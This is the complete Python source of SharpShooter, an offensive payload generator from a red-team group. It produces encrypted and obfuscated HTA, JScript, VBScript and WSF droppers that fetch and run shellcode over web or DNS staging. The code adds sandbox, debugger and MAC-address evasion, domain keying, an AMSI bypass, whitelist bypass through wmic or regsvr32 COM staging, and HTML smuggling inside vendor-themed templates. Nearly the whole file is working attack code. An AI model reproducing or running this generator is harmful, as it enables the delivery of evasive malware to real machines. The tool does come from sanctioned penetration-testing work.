#! /usr/bin/env python

# -*- coding: utf-8 -*-
#
# SharpShooter:
#   Payload Generation with CSharp and DotNetToJScript
# Version:
#   1.0
# Author:
#   Dominic Chell (@domchell), MDSec ActiveBreach (@mdseclabs)

from __future__ import print_function

import base64
import gzip
import random
import string
import sys
import argparse
from jsmin import jsmin
from modules import *

try:
    raw_input
    input = raw_input
except NameError:
    pass

try:
    from cStringIO import StringIO as BytesIO
except ImportError:
    from io import BytesIO


class SharpShooter:
    banner = """
       _____ __                    _____ __                __           
      / ___// /_  ____ __________ / ___// /_  ____  ____  / /____  _____
      \__ \/ __ \/ __ `/ ___/ __ \\__ \/ __ \/ __ \/ __ \/ __/ _ \/ ___/
     ___/ / / / / /_/ / /  / /_/ /__/ / / / / /_/ / /_/ / /_/  __/ /    
    /____/_/ /_/\__,_/_/  / .___/____/_/ /_/\____/\____/\__/\___/_/     
                         /_/                                            

     \033[1;32mDominic Chell, @domchell, MDSec ActiveBreach, v1.0\033[0;0m
    """

    def validate_args(self):
        print(self.banner)

        antisandbox = "\n\033[92m[1]\033[0;0m Key to Domain (e.g. 1=CONTOSO)"
        antisandbox += "\n\033[92m[2]\033[0;0m Ensure Domain Joined"
        antisandbox += "\n\033[92m[3]\033[0;0m Check for Sandbox Artifacts"
        antisandbox += "\n\033[92m[4]\033[0;0m Check for Bad MACs"
        antisandbox += "\n\033[92m[5]\033[0;0m Check for Debugging"

        parser = argparse.ArgumentParser(description="", formatter_class=argparse.RawTextHelpFormatter)
        parser.add_argument("--stageless", action='store_true', help="Create a stageless payload")
        parser.add_argument("--dotnetver", metavar="<ver>", dest="dotnetver", default=None, help="Target .NET Version: 2 or 4")
        parser.add_argument("--com", metavar="<com>", dest="comtechnique", default=None, help="COM Staging Technique: outlook, shellbrowserwin, wmi, wscript, xslremote")
        parser.add_argument("--awl", metavar="<awl>", dest="awltechnique", default=None, help="Application Whitelist Bypass Technique: wmic, regsvr32")
        parser.add_argument("--awlurl", metavar="<awlurl>", dest="awlurl", default=None, help="URL to retrieve XSL/SCT payload")
        parser.add_argument("--payload", metavar="<format>", dest="payload", default=None, help="Payload type: hta, js, jse, vba, vbe, vbs, wsf")
        parser.add_argument("--sandbox", metavar="<types>", dest="sandbox", default=None, help="Anti-sandbox techniques: " + antisandbox)
        parser.add_argument("--amsi", metavar="<amsi>", dest="amsi", default=None, help="Use amsi bypass technique: amsienable")
        parser.add_argument("--delivery", metavar="<type>", dest="delivery", default=None, help="Delivery method: web, dns, both")
        parser.add_argument("--rawscfile", metavar="<path>", dest="rawscfile", default=None, help="Path to raw shellcode file for stageless payloads")
        parser.add_argument("--shellcode", action='store_true', help="Use built in shellcode execution")
        parser.add_argument("--scfile", metavar="<path>", dest="shellcode_file", default=None, help="Path to shellcode file as CSharp byte array")
        parser.add_argument("--refs", metavar="<refs>", dest="refs", default=None, help="References required to compile custom CSharp,\ne.g. mscorlib.dll,System.Windows.Forms.dll")
        parser.add_argument("--namespace", metavar="<ns>", dest="namespace", default=None, help="Namespace for custom CSharp,\ne.g. Foo.bar")
        parser.add_argument("--entrypoint", metavar="<ep>", dest="entrypoint", default=None, help="Method to execute,\ne.g. Main")
        parser.add_argument("--web", metavar="<web>", dest="web", default=None, help="URI for web delivery")
        parser.add_argument("--dns", metavar="<dns>", dest="dns", default=None, help="Domain for DNS delivery")
        parser.add_argument("--output", metavar="<output>", dest="output", default=None, help="Name of output file (e.g. maldoc)")
        parser.add_argument("--smuggle", action='store_true', help="Smuggle file inside HTML")
        parser.add_argument("--template", metavar="<tpl>", dest="template", default=None, help="Name of template file (e.g. mcafee)")

        args = parser.parse_args()

        if not args.dotnetver:
            print("\033[1;31m[!]\033[0;0m Missing --dotnetver argument")
            sys.exit(-1)
        else:
            try:
                dotnetver = int(args.dotnetver)

                if (not dotnetver == 2 and not dotnetver == 4):
                    raise Exception
            except Exception as e:
                print("\033[1;31m[!]\033[0;0m Invalid .NET version")
                sys.exit(-1)

        if not args.payload:
            print("\033[1;31m[!]\033[0;0m Missing --payload argument")
            sys.exit(-1)
        if not args.delivery and not args.stageless:
            print("\033[1;31m[!]\033[0;0m Missing --delivery argument")
            sys.exit(-1)
        if not args.output:
            print("\033[1;31m[!]\033[0;0m Missing --output argument")
            sys.exit(-1)

        if(args.stageless) and (args.delivery or args.dns or args.web):
            print("\033[1;31m[!]\033[0;0m Stageless payloads are not compatible with delivery arguments")
            sys.exit(-1)

        if(args.delivery == "both"):
            if(not args.web or not args.dns):
                print("\033[1;31m[!]\033[0;0m Missing --web and --dns arguments")
                sys.exit(-1)
        elif(args.delivery == "web"):
            if not args.web:
                print("\033[1;31m[!]\033[0;0m Missing --web arguments")
                sys.exit(-1)
        elif(args.delivery == "dns"):
            if not args.dns:
                print("\033[1;31m[!]\033[0;0m Missing --dns arguments")
                sys.exit(-1)
        elif(args.delivery):
            print("\033[1;31m[!]\033[0;0m Invalid delivery method")
            sys.exit(-1)

        if(not args.shellcode and not args.stageless):
            if not args.refs or not args.namespace or not args.entrypoint:
                print("\033[1;31m[!]\033[0;0m Custom CSharp selected, --refs, --namespace and --entrypoint arguments required")
                sys.exit(-1)
        else:
            if(not args.shellcode_file and not args.stageless):
                print("\033[1;31m[!]\033[0;0m Built-in CSharp template selected, --scfile argument required")
                sys.exit(-1)

        if(args.stageless and not args.rawscfile):
            print("\033[1;31m[!]\033[0;0m Stageless payloads require the --rawscfile argument")
            sys.exit(-1)

        if(args.smuggle):
            if not args.template:
                print("\033[1;31m[!]\033[0;0m Template name required when smuggling")
                sys.exit(-1)

        if(args.comtechnique):
            if not args.awlurl:
                print("\033[1;31m[!]\033[0;0m --awlurl required when COM staging")
                sys.exit(-1)

        return args

    def read_file(self, f):
        with open(f, 'r') as fs:
            content = fs.read()
        return content

    def rand_key(self, n):
        return ''.join([random.choice(string.lowercase) for i in xrange(n)])

    def gzip_str(self, string_):
        fgz = BytesIO()
        try:
            string_ = string_.encode()
        except:
            pass

        gzip_obj = gzip.GzipFile(mode='wb', fileobj=fgz)
        gzip_obj.write(string_)
        gzip_obj.close()
        return fgz

    def rc4(self, key, data):
        S = range(256)
        j = 0
        out = []

        for i in range(256):
            j = (j + S[i] + ord(key[i % len(key)])) % 256
            S[i], S[j] = S[j], S[i]

        i = j = 0
        for char in data:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            out.append(chr(ord(char) ^ S[(S[i] + S[j]) % 256]))

        return ''.join(out)

    def run(self, args):

        template_body = ""
        template_base = "templates/sharpshooter."
        shellcode_delivery = False
        shellcode_gzip = ""
        payload_type = 0

        dotnet_version = 1

        dotnet_version = int(args.dotnetver)

        stageless_payload = False
        
        if((args.stageless or stageless_payload is True) and dotnet_version == 2):
            template_base = "templates/stageless."
        elif((args.stageless or stageless_payload is True) and dotnet_version == 4):
            template_base = "templates/stagelessv4."
        elif(dotnet_version == 4):
            template_base = "templates/sharpshooterv4."

        #print(template_base)

        if(args.payload == "hta"):
            payload_type = 1
        elif(args.payload == "js"):
            payload_type = 2
        elif(args.payload == "jse"):
            payload_type = 3
        elif(args.payload == "vba"):
            payload_type = 4
        elif(args.payload == "vbe"):
            payload_type = 5
        elif(args.payload == "vbs"):
            payload_type = 6
        elif(args.payload == "wsf"):
            payload_type = 7

        try:
            payload_type = int(payload_type)
            if (payload_type < 1 or payload_type > 7):
                raise Exception

            if(payload_type == 1):
                if(args.comtechnique):
                    template_body = self.read_file(template_base + "js")
                else:
                    template_body = self.read_file(template_base + "vbs")
                file_type = "hta"
            elif(payload_type == 2):
                template_body = self.read_file(template_base + "js")
                file_type = "js"
            elif(payload_type == 3):
                template_body = self.read_file(template_base + "js")
                file_type = "js"
            elif(payload_type == 4):
                print("\n\033[93m[!]\033[0;0m VBA support is still under development")
                raise Exception
                    #template_body = read_file(template_base + "vba")
                    #file_type = "vba"
            elif(payload_type == 5):
                if(args.comtechnique):
                    template_body = self.read_file(template_base + "js")
                else:
                    template_body = self.read_file(template_base + "vbs")
                file_type = "vbs"
            elif(payload_type == 6):
                if(args.comtechnique):
                    template_body = self.read_file(template_base + "js")
                else:
                    template_body = self.read_file(template_base + "vbs")
                file_type = "vbs"
            elif(payload_type == 7):
                template_body = self.read_file(template_base + "js")
                file_type = "wsf"
        except Exception as e:
            print("\n\033[1;31m[!]\033[0;0m Incorrect choice")

        sandbox_techniques=""
        techniques_list = []
        sandboxevasion_type = 0

        if(args.sandbox):
            techniques_list = args.sandbox.split(",")

        while True:
            if(techniques_list):
                sandboxevasion_type = techniques_list[0]
                techniques_list.remove(techniques_list[0])
                if not sandboxevasion_type:
                    sandboxevasion_type = "0"
            else:
                sandboxevasion_type = "0"

            try:
                if("1" in sandboxevasion_type):
                    domainkey = sandboxevasion_type.split("=")
                    domain_name = domainkey[1]
                    sandboxevasion_type = domainkey[0]

                sandboxevasion_type = int(sandboxevasion_type)
                if sandboxevasion_type > 5: raise Exception

                if (sandboxevasion_type == 1):
                    domain_name = domain_name.strip()

                    if not domain_name: raise Exception

                    if len(domain_name) <= 1:
                        raise Exception
                    else:
                        print("\033[1;34m[*]\033[0;0m Adding keying for %s domain" % (domain_name))
                        if("js" in file_type or args.comtechnique):
                            sandbox_techniques += "\to.CheckPlease(0, \"%s\")\n" % domain_name
                        else:
                            sandbox_techniques += "o.CheckPlease 0, \"%s\"\n" % domain_name
                        continue
                elif(sandboxevasion_type == 2):
                    print("\033[1;34m[*]\033[0;0m Keying to domain joined systems")
                    if("js" in file_type or args.comtechnique):
                        sandbox_techniques += "\to.CheckPlease(1,\"foo\")\n"
                    else:
                        sandbox_techniques += "o.CheckPlease 1, \"foo\"\n"
                    continue
                elif(sandboxevasion_type == 3):
                    print("\033[1;34m[*]\033[0;0m Avoiding sandbox artifacts")

                    if("js" in file_type or args.comtechnique):
                        sandbox_techniques += "\to.CheckPlease(2,\"foo\")\n"
                    else:
                        sandbox_techniques += "o.CheckPlease 2,\"foo\"\n"
                    continue
                elif(sandboxevasion_type == 4):
                    print("\033[1;34m[*]\033[0;0m Avoiding bad MACs")

                    if("js" in file_type or args.comtechnique):
                        sandbox_techniques += "\to.CheckPlease(3,\"foo\")\n"
                    else:
                        sandbox_techniques += "o.CheckPlease 3,\"foo\"\n"
                    continue
                elif(sandboxevasion_type == 5):
                    print("\033[1;34m[*]\033[0;0m Avoiding debugging")

                    if("js" in file_type or args.comtechnique):
                        sandbox_techniques += "\to.CheckPlease(4,\"foo\")\n"
                    else:
                        sandbox_techniques += "o.CheckPlease 4,\"foo\"\n"
                    continue
                elif(sandboxevasion_type == 0):
                    break

            except Exception as e:
                print("\n\033[1;31m[!]\033[0;0m Incorrect choice")

        template_code = template_body.replace("%SANDBOX_ESCAPES%", sandbox_techniques)

        delivery_method = "1"
        encoded_sc = ""
        while True:

            if(args.delivery == "web"):
                delivery_method = "1"
            elif args.delivery == "dns":
                delivery_method = "2"
            else:
                delivery_method = "3"

            try:
                delivery_method = int(delivery_method)

                if args.shellcode:
                    shellcode_payload = "y"
                else:
                    shellcode_payload = "n"

                shellcode_payload = shellcode_payload.lower()
                if (shellcode_payload == "y" or shellcode_payload == "yes"):
                    shellcode_delivery = True
                    shellcode_template = self.read_file("templates/shellcode.cs")

                    shellcode = []

                    sc = self.read_file(args.shellcode_file)
                    shellcode.append(sc)

                    shellcode = "\n".join(shellcode)

                    shellcode_final = shellcode_template.replace("%SHELLCODE%", shellcode)
                    shellcode_gzip = self.gzip_str(shellcode_final)

                elif (args.stageless or stageless_payload is True):
                    rawsc = self.read_file(args.rawscfile)
                    encoded_sc = base64.b64encode(rawsc)
                    #if("vbs" in file_type or "hta" in file_type):
                    #    sc_split = [encoded_sc[i:i+100] for i in range(0, len(encoded_sc), 100)]
                    #    for i in sc_split:
                    #else:
                    template_code = template_code.replace("%SHELLCODE64%", encoded_sc)

                else:
                    refs = args.refs
                    namespace = args.namespace
                    entrypoint = args.entrypoint

                if (shellcode_delivery):
                    refs = "mscorlib.dll"
                    namespace = "ShellcodeInjection.Program"
                    entrypoint = "Main"

                if(delivery_method == 1 and not stageless_payload):
                    stager = args.web

                    if("js" in file_type or "wsf" in file_type or args.comtechnique):
                        template_code = template_code.replace("%DELIVERY%", "o.Go(\"%s\", \"%s\", \"%s\", 1, \"%s\");" % (refs, namespace, entrypoint, stager))
                    else:
                        template_code = template_code.replace("%DELIVERY%", "o.Go \"%s\", \"%s\", \"%s\", 1, \"%s\"" % (refs, namespace, entrypoint, stager))

                if(delivery_method == 2 and not stageless_payload):
                    stager = args.dns

                    if("js" in file_type or "wsf" in file_type or args.comtechnique):
                        template_code = template_code.replace("%DELIVERY%", "\to.Go(\"%s\", \"%s\", \"%s\", 2, \"%s\");" % (refs, namespace, entrypoint, stager))
                    else:
                        template_code = template_code.replace("%DELIVERY%", "\to.Go \"%s\", \"%s\", \"%s\", 2, \"%s\"" % (refs, namespace, entrypoint, stager))

                if((delivery_method == 3) and (not args.stageless) and (not stageless_payload)):
                    stager = args.web

                    if("js" in file_type or "wsf" in file_type or args.comtechnique):
                        webdelivery = "\to.Go(\"%s\", \"%s\", \"%s\", 1, \"%s\");\n" % (refs, namespace, entrypoint, stager)
                    else:
                        webdelivery = "\to.Go \"%s\", \"%s\", \"%s\", 1, \"%s\"\n" % (refs, namespace, entrypoint, stager)

                    stager = args.dns

                    if("js" in file_type or "wsf" in file_type or args.comtechnique):
                        dnsdelivery = "\to.Go(\"%s\", \"%s\", \"%s\", 2, \"%s\");" % (refs, namespace, entrypoint, stager)
                    else:
                        dnsdelivery = "\to.Go \"%s\", \"%s\", \"%s\", 2, \"%s\"" % (refs, namespace, entrypoint, stager)

                    deliverycode = webdelivery + dnsdelivery
                    template_code = template_code.replace("%DELIVERY%", deliverycode)

                break
            except Exception as e:
                print(e)
                print("\n\033[1;31m[!]\033[0;0m Incorrect choice")
                sys.exit(-1)

        amsi_bypass = ""
        outputfile = args.output
        outputfile_payload = outputfile + "." + file_type
        if args.amsi:
            amsi_bypass = amsikiller.amsi_stub(file_type, args.amsi, outputfile_payload)

            if "vb" in file_type or "hta" in file_type:
                template_code = amsi_bypass + template_code + "\nOn Error Goto 0\nEnd If"
            else:
                template_code = amsi_bypass + template_code + "}"

        #print(template_code)

        key = self.rand_key(10)
        payload_encrypted = self.rc4(key, template_code)
        payload_encoded = base64.b64encode(payload_encrypted)

        awl_payload_simple = ""

        if("js" in file_type or args.comtechnique):
            harness = self.read_file("templates/harness.js")
            payload = harness.replace("%B64PAYLOAD%", payload_encoded)
            payload = payload.replace("%KEY%", "'%s'" % (key))
            payload_minified = jsmin(payload)
            awl_payload_simple = template_code
        elif("wsf" in file_type):
            harness = self.read_file("templates/harness.wsf")
            payload = harness.replace("%B64PAYLOAD%", payload_encoded)
            payload = payload.replace("%KEY%", "'%s'" % (key))
            payload_minified = jsmin(payload)
        elif("hta" in file_type):
            harness = self.read_file("templates/harness.hta")
            payload = harness.replace("%B64PAYLOAD%", payload_encoded)
            payload = payload.replace("%KEY%", "'%s'" % (key))
            payload_minified = jsmin(payload)
        elif("vba" in file_type):
            harness = self.read_file("templates/harness.vba")
            payload = harness.replace("%B64PAYLOAD%", payload_encoded)
            payload = payload.replace("%KEY%", "\"%s\"" % (key))
            payload_minified = jsmin(payload)
        else:
            harness = self.read_file("templates/harness.vbs")
            payload = harness.replace("%B64PAYLOAD%", payload_encoded)
            payload = payload.replace("%KEY%", "\"%s\"" % (key))

        if (payload_type == 3):
            file_type = "jse"
        elif (payload_type == 5):
            file_type = "vbe"

        
        f = open("output/" + outputfile_payload, 'w')
        
        #print(payload)

        if(args.comtechnique):
            if not args.awltechnique or args.awltechnique == "wmic":
                payload_file = "output/" + outputfile + ".xsl"
            else:
                payload_file = "output/" + outputfile + ".sct"

            #if("js" in file_type or "hta" in file_type or "wsf" in file_type):
            awl_payload = awl.create_com_stager(args.comtechnique, file_type, args.awlurl, payload_file, awl_payload_simple)
            #else:
            #    awl_payload = awl.create_com_stager(args.comtechnique, file_type, args.awlurl, payload_file, payload)
            f.write(awl_payload)
        elif("js" in file_type or "hta" in file_type or "wsf" in file_type):
            f.write(payload_minified)
        else:
            f.write(payload)
        f.close()

        print("\033[1;34m[*]\033[0;0m Written delivery payload to output/%s" % outputfile_payload)
        if shellcode_delivery:
            outputfile_shellcode = outputfile + ".payload"
            with open("output/" + outputfile_shellcode, 'w') as f:
                gzip_encoded = base64.b64encode(shellcode_gzip.getvalue())
                f.write(gzip_encoded)
                f.close()
                print("\033[1;34m[*]\033[0;0m Written shellcode payload to output/%s" % outputfile_shellcode)

        if "vba" not in file_type:
            smuggle = "n"
            if(args.smuggle):
                    smuggle = "y"

            if (smuggle == "y" or smuggle == "yes"):
                key = self.rand_key(10)
                template = ""
                template = args.template
                embedinhtml.run_embedInHtml(key, "./output/" + outputfile_payload, "./output/" + outputfile + ".html", template)

if __name__ == "__main__":
    ss = SharpShooter()
    args = ss.validate_args()
    ss.run(args)
